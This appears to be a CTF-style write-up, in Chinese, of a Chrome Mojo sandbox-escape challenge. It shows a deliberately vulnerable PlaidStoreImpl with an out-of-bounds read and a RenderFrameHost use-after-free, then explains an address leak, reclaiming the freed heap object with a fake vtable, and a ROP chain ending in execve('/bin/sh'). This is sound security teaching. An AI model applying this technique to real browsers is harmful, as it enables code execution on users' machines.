# 漏洞
1.没有对getdata的count做校验，导致越界读
```
+void PlaidStoreImpl::GetData(
+    const std::string &key,
+    uint32_t count,
+    GetDataCallback callback) {
+  if (!render_frame_host_->IsRenderFrameLive()) {
+    std::move(callback).Run({});
+    return;
+  }
+  auto it = data_store_.find(key);
+  if (it == data_store_.end()) {
+    std::move(callback).Run({});
+    return;
+  }
+  std::vector<uint8_t> result(it->second.begin(), it->second.begin() + count);
+  std::move(callback).Run(result);
+}
```

2.

PlaidStoreImpl具体定义如下，注意在构造时存储了render_frame_host_
```
+namespace content {
+
+class RenderFrameHost;
+
+class PlaidStoreImpl : public blink::mojom::PlaidStore {
+ public:
+  explicit PlaidStoreImpl(RenderFrameHost *render_frame_host);
+
+  static void Create(
+      RenderFrameHost* render_frame_host,
+      mojo::PendingReceiver<blink::mojom::PlaidStore> receiver);
+
+  ~PlaidStoreImpl() override;
+
+  // PlaidStore overrides:
+  void StoreData(
+      const std::string &key,
+      const std::vector<uint8_t> &data) override;
+
+  void GetData(
+      const std::string &key,
+      uint32_t count,
+      GetDataCallback callback) override;
+
+ private:
+  RenderFrameHost* render_frame_host_;
+  std::map<std::string, std::vector<uint8_t> > data_store_;
+};
+
+} // namespace content

+namespace content {
+
+PlaidStoreImpl::PlaidStoreImpl(
+    RenderFrameHost *render_frame_host)
+    : render_frame_host_(render_frame_host) {}
+
+PlaidStoreImpl::~PlaidStoreImpl() {}
+
+void PlaidStoreImpl::StoreData(
+    const std::string &key,
+    const std::vector<uint8_t> &data) {
+  if (!render_frame_host_->IsRenderFrameLive()) {
+    return;
+  }
+  data_store_[key] = data;
+}
+
+void PlaidStoreImpl::GetData(
+    const std::string &key,
+    uint32_t count,
+    GetDataCallback callback) {
+  if (!render_frame_host_->IsRenderFrameLive()) {
+    std::move(callback).Run({});
+    return;
+  }
+  auto it = data_store_.find(key);
+  if (it == data_store_.end()) {
+    std::move(callback).Run({});
+    return;
+  }
+  std::vector<uint8_t> result(it->second.begin(), it->second.begin() + count);
+  std::move(callback).Run(result);
+}
+
+// static
+void PlaidStoreImpl::Create(
+    RenderFrameHost *render_frame_host,
+    mojo::PendingReceiver<blink::mojom::PlaidStore> receiver) {
+  mojo::MakeSelfOwnedReceiver(std::make_unique<PlaidStoreImpl>(render_frame_host),
+                              std::move(receiver));
+}
+
+} // namespace content
```

此处一个MakeSelfOwnedReceiver表面此PlaidStoreImpl是一个StrongBinding，这意味着它掌控它自己，只有当interface关闭了或者出现通信错误了才会调用析构函数。这样的话，如果我们先释放了RenderFrameHost，再在PlaidStoreImpl中调用的话，就是一个UaF漏洞了。通过伪造vtable，我们可以在调用render_frame_host_->IsRenderFrameLive()时控制程序流程。
```
+void PlaidStoreImpl::Create(
+    RenderFrameHost *render_frame_host,
+    mojo::PendingReceiver<blink::mojom::PlaidStore> receiver) {
+  mojo::MakeSelfOwnedReceiver(std::make_unique<PlaidStoreImpl>(render_frame_host),
+                              std::move(receiver));
+}
```

# 利用

## 泄露地址

每一个PlaidStoreImpl的排布大致如下，如果我们申请多个，在getdata的时候就可以读取下一个PlaidStoreImpl的vtable和render_frame_host
```
0x0000558de05837a0 <= vtable    0x000021499c6e4400 <= render_frame_host
0x000021499c74e048 <= data      0x0000000000000000
```
浏览器基地址可以通过vtable算出,用于寻找gadget，render_frame_host用于后续rop

## uaf

两个函数（storedata和getdata）开头的处都会检查render_frame_host_->IsRenderFrameLive(), 但是并没有检查render_frame_host_ 是否可用，我们可以创建一个iframe ，绑定一个PlaidStoreImpl并泄露render_frame_host返回给 parent, 然后删除这个iframe，这个时候render_frame_host_ 被释放了，但是仍可以调用getData 和storeData
于是可以进行申请PlaidStoreImpl相同size的块获取到被释放的render_frame_host_ , 改写其vtable，然后在执行render_frame_host_->IsRenderFrameLive() 的时候就可以劫持控制流。

RenderFrameHost 对象使用content::RenderFrameHostFactory::Create() 函数创建
```
f1ag@f1ag-virtual-machine:~/chrome$ nm --demangle  ./chrome |grep -i 'content::RenderFrameHostFactory::Create'  
0000000003b219e0 t content::RenderFrameHostFactory::Create(content::SiteInstance*, scoped_refptr<content::RenderViewHostImpl>, content::RenderFrameHostDelegate*, content::FrameTree*, content::FrameTreeNode*, int, int, bool)
```
简单跟几步就可以得到RenderFrameHost的size为0xc28
```
0x0000555559075a50 <+112>:   jmp    0x555559075aca <content::RenderFrameHostFactory::Create(content::SiteInstance*, scoped_refptr<content::RenderViewHostImpl>, content::RenderFrameHostDelegate*, content::Fram
eTree*, content::FrameTreeNode*, int, int, bool)+234>
// new(0xc28) 
   0x0000555559075a52 <+114>:   mov    edi,0xc28
   0x0000555559075a57 <+119>:   call   0x55555ac584b0 <operator new(unsigned long, std::nothrow_t const&)>
   0x0000555559075a5c <+124>:   mov    rdi,rax
   0x0000555559075a5f <+127>:   mov    rax,QWORD PTR [r14]
   0x0000555559075a62 <+130>:   mov    QWORD PTR [rbp-0x38],rax
   0x0000555559075a66 <+134>:   mov    QWORD PTR [r14],0x0
   0x0000555559075a6d <+141>:   sub    rsp,0x8
   0x0000555559075a71 <+145>:   movzx  eax,BYTE PTR [rbp+0x20]
   0x0000555559075a75 <+149>:   lea    rdx,[rbp-0x38]
   0x0000555559075a79 <+153>:   mov    r14,rdi
   0x0000555559075a7c <+156>:   mov    rsi,rbx
   0x0000555559075a7f <+159>:   mov    rcx,r13
   0x0000555559075a82 <+162>:   mov    r8,r12
   0x0000555559075a85 <+165>:   mov    r9,r15
```
覆写fakevtable中的IsRenderFrameLive
查看getdata头部第一次函数调用，这里就是IsRenderFrameLive
```
.text:0000000003C582C1                 mov     r15, rcx
.text:0000000003C582C4                 mov     r12d, edx
.text:0000000003C582C7                 mov     r14, rsi
.text:0000000003C582CA                 mov     rbx, rdi
.text:0000000003C582CD                 mov     rdi, [rdi+8]
.text:0000000003C582D1                 mov     rax, [rdi]
.text:0000000003C582D4                 call    qword ptr [rax+160h] ;here is IsRenderFrameLive
.text:0000000003C582DA                 test    al, al
.text:0000000003C582DC                 jz      loc_3C5836E
.text:0000000003C582E2                 lea     rdi, [rbx+10h]
.text:0000000003C582E6                 mov     rsi, r14
```
## rop布局
xchg rax, rsp中rax的值通过在IsRenderFrameLive下断点即可得知
```
frame_addr =>   [0x00] : vtable  ==> frame_addr + 0x10  ------------\
				[0x08] : none										|
				[0x10] : none										|
                [0x18] : gadget => pop rdi                 			|
            /-- [0x20] : frame_addr + 0x178 						|
            |   [0x28] : gadget => pop rsi                          |
            |   [0x30] : 0     										|
			|	[0x38] : gadget => pop rdx                          |
            |   [0x40] : 0                       					| vtable+0x10   
            |   [0x48] : gadget => pop rax   						|
			|   [0x50] : 59   										|
			|   [0x58] : gadget => syscall  						|
            |   ...                                                 V
            |   [0x160 + 0x10] : xchg rax, rsp ;(rax=vtable) <= isRenderFrameLive
            ->  [0x160 + 0x18] :  "/bin/sh\x00"
```
